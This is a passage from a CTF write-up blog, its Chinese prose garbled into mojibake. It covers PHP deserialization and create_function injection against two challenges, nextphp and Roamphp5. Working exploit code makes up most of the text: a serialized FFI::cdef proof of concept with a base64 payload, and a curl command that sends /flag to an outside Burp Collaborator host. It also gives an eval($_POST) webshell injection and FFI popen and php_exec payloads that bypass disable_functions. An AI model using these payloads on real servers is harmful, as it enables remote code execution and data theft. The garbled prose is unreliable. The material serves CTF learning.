&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__set&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æœç†Ÿè¯»ä»¥ä¸Šä¸‰ä¸ªæ–‡æ¡£ï¼Œè¿™ä¸ªé¢˜å°±å¾ˆå¥½å‡ºäº†&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æŠŠfuncè®¾ä¸º&lt;code>FFI:cdef&lt;/code>ï¼Œargè®¾ä¸º&lt;code>int system(char *command)&lt;/code>æ¥æ‰§è¡Œcä»£ç ç»•è¿‡php.iniä¸­çš„é™åˆ¶ï¼›åŒæ—¶ç”±äºSerializableçš„ç§ç§æ–°ç‰¹æ€§ï¼ˆå‡ºé¢˜äººä¹Ÿåœ¨è¿™é‡Œè®¾äº†å‘ï¼‰ï¼Œæˆ‘ä»¬åœ¨æ„é€ pocæ—¶è¦åˆ é™¤&lt;code>__serialize()&lt;/code>ï¼Œé˜²æ­¢ç›´æ¥returnè¿›å‘é‡Œäº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;FFI::cdef&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;int system(char *command);&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">run&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__set&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;start&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>éšååœ¨ä¼ å…¥çš„åœ°æ–¹æ‰§è¡Œ&lt;code>unserialize(base64_decode(payload))-&amp;gt;__serialize()['ret']-&amp;gt;system(command);&lt;/code>ï¼Œç›´æ¥curlå¤–å¸¦flag&lt;/p>
&lt;pre tabindex="0">&lt;code>?a=unserialize(base64_decode(QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319))-&amp;gt;__serialize()[&amp;#39;ret&amp;#39;]-&amp;gt;system(&amp;#34;curl -d @/flag http://fm56ifsleqz363dh864mlhvtzk5atz.burpcollaborator.net&amp;#34;);
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223140032.png" alt="image-20211202223140032">&lt;/p>
&lt;p>â€”â€”â€”â€”åœ¨è¿™ä¸ªé¢˜å‡ºç°ä¹‹åèšå‰‘è¿˜ä¸“é—¨å‡ºäº†å¯¹åº”çš„æ’ä»¶&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223257130.png" alt="image-20211202223257130">&lt;/p>
&lt;p>ä½†æ˜¯å¤šæ¬¡å°è¯•å¤±è´¥ï¼Œä¹‹åçœ‹åˆ°äº†è¿™ä¸ª&lt;a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">wp&lt;/a>ä¹‹åå†çœ‹&lt;a href="https://wiki.php.net/rfc/ffi">å®˜æ–¹æ–‡æ¡£&lt;/a>è¿˜æœ‰&lt;a href="https://www.laruence.com/2020/03/11/5475.html">è¿™ä¸€ç¯‡&lt;/a>å°±æ˜ç™½äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223422195.png" alt="image-20211202223422195">&lt;/p>
&lt;p>é»˜è®¤æƒ…å†µä¸‹FFIåªä¼šè¢«ç”¨äºCLIæ¨¡å¼ä¸‹&amp;amp;é¢„åŠ è½½phpè„šæœ¬ï¼Œé™¤éè®¾ç½®&lt;code>ffi.enable=true&lt;/code>ï¼Œè®¾ç½®ä¹‹ååœ¨webshellå°±å¯ä»¥ç›´æ¥ç”¨èšå‰‘æ’ä»¶äº†&lt;/p>
&lt;h3 id="æå®¢å¤§æŒ‘æˆ˜-2020roamphp5-fighterfightsinvincibly">[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp5-FighterFightsInvincibly&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173057497.png" alt="image-20211204173057497">&lt;/p>
&lt;p>å¾ˆæ¼‚äº®çš„å‰ç«¯ï¼Œçœ‹é¡µé¢æºç æœ‰æ³¨é‡Šçš„æç¤º&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173130852.png" alt="image-20211204173130852">&lt;/p>
&lt;p>è¿™ä¸ªå½¢å¼ï¼ŒçœŸçš„æ˜¯ä¸€çœ¼&lt;code>create_function()&lt;/code>äº†ï¼Œçœ‹ä¸€ä¸‹phpinfo()ï¼Œç”¨çš„è¿˜æ˜¯&lt;code>create_function()&lt;/code>çš„æ³¨å…¥&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}phpinfo();/*
&lt;/code>&lt;/pre>&lt;p>çœ‹ä¸‹disable_function&lt;/p>
&lt;pre tabindex="0">&lt;code>system,exec,shell_exec,passthru,proc_open,proc_close,&amp;amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&amp;amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&amp;amp;nbsp;socket_connect,&amp;amp;nbsp;stream_socket_server,&amp;amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&amp;amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&amp;amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&amp;amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,&amp;amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&amp;amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&amp;amp;nbsp;posix_getrlimit,&amp;amp;nbsp;posix_getsid,posix_getuid,posix_isatty,&amp;amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&amp;amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname&amp;lt;/td&amp;gt;&amp;lt;td class=&amp;#34;v&amp;#34;&amp;gt;system,exec,shell_exec,passthru,proc_open,proc_close,&amp;amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&amp;amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&amp;amp;nbsp;socket_connect,&amp;amp;nbsp;stream_socket_server,&amp;amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&amp;amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&amp;amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&amp;amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,&amp;amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&amp;amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&amp;amp;nbsp;posix_getrlimit,&amp;amp;nbsp;posix_getsid,posix_getuid,posix_isatty,&amp;amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&amp;amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname
&lt;/code>&lt;/pre>&lt;p>ç›´æ¥ä¸ç”¨çœ‹äº†ï¼Œæœ‰ä¸€å¨ï¼Œè‚¯å®šå¾—ç»•è¿‡ï¼›èšå‰‘çš„å„ç§æ’ä»¶éƒ½å¤±è´¥ï¼Œå¾—æ‰‹åŠ¨ç»•ï¼Œffiæ‰©å±•å¼€ç€&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204174245283.png" alt="image-20211204174245283">&lt;/p>
&lt;p>çœ‹åˆ°è¿™é‡Œ&lt;code>ffi.enable=On&lt;/code>ï¼Œç¬¦åˆèšå‰‘æ’ä»¶çš„åº”ç”¨æ¡ä»¶ï¼Œå†™ä¸ªwebshellè¯•è¯•&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}eval($_POST[wuhu]);/*
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204175626714.png" alt="image-20211204175626714">&lt;/p>
&lt;p>what&amp;rsquo;s upï¼Œç«Ÿç„¶æ²¡æœ‰å›æ˜¾&lt;/p>
&lt;p>å°è¯•pingï¼Œå‘ç°è¿˜ä¸å‡ºç½‘ï¼Œä¸èƒ½ç”¨curlå¤–å¸¦flag&lt;/p>
&lt;p>é‚£åªèƒ½ä»FFIæœ¬èº«ä¸‹æ‰‹äº†ï¼Œè°ƒç”¨cçš„popen ç”¨ç®¡é“è¯»å‘½ä»¤æ‰§è¡Œçš„ç»“æœ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">FILE&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>popen&lt;/code>ä¼šè°ƒç”¨&lt;code>fork()&lt;/code>äº§ç”Ÿå­è¿›ç¨‹ï¼Œç„¶åä»å­è¿›ç¨‹ä¸­è°ƒç”¨&lt;code>/bin/sh -c&lt;/code>æ¥æ‰§è¡Œå‚æ•°çš„å‘½ä»¤ï¼Œtypeæœ‰r(read)å’Œw(write)ï¼Œä¾ç…§è¿™ä¸ªå€¼&lt;code>popen&lt;/code>ä¼šå»ºç«‹ç®¡é“è¿æ¥åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºè®¾å¤‡æˆ–å†™å…¥åˆ°å­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥è®¾å¤‡ä¸­&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}$ffi = FFI::cdef(&amp;#34;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&amp;#34;,&amp;#34;libc.so.6&amp;#34;);$o = $ffi-&amp;gt;popen(&amp;#34;ls / -lah&amp;#34;,&amp;#34;r&amp;#34;);$d = &amp;#34;&amp;#34;;while(($c = $ffi-&amp;gt;fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,&amp;#34;0&amp;#34;,0);}$ffi-&amp;gt;pclose($o);echo hex2bin($d);/*
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204180626497.png" alt="image-20211204180626497">&lt;/p>
&lt;p>å¦ä¸€ç§æ–¹æ³•æ˜¯è°ƒç”¨phpæºç ä¸­çš„å‡½æ•°&lt;code>php_exec()&lt;/code>ï¼Œå½“å®ƒçš„å‚æ•°typeä¸º3æ—¶å¯¹åº”è°ƒç”¨çš„æ˜¯&lt;code>passthru()&lt;/code>å‡½æ•°ï¼Œå…¶æ‰§è¡Œå‘½ä»¤å¯ä»¥å°†ç»“æœåŸå§‹è¾“å‡º&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}$ffi = FFI::cdef(&amp;#34;int php_exec(int type, char *cmd);&amp;#34;);$ffi-&amp;gt;php_exec(3,&amp;#34;ls /&amp;#34;);/*
&lt;/code>&lt;/pre>&lt;p>ä½†æ˜¯ï¼Œè¿™é“é¢˜åœ¨buuå¤ç°ä¸äº†ï¼ŒåŸå› æ˜¯uuidæœ‰32ä¸ªå­—ç¬¦ï¼ŒåŠ ä¸Šè¿å­—ç¬¦æœ‰36ä½ï¼Œå†åŠ ä¸Šflag{}æœ‰42ä½ï¼Œä½†æ˜¯/readflagç¨‹åºåªå…è®¸è¯»å‡º37ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æœ€åçš„5ä½æ˜¯è¯»ä¸å‡ºæ¥çš„ï¼ˆè¾£ä¸ªå”¯ä¸€è§£å¯èƒ½æ˜¯çˆ†ç ´çš„ æˆ‘è¯•ç€çˆ†äº†ä¸€ä¼š åŠ å»¶æ—¶å¾—è·‘å¥½ä¹…å¥½ä¹…å¥½ä¹… æ”¾å¼ƒäº†&lt;/p>
&lt;hr>
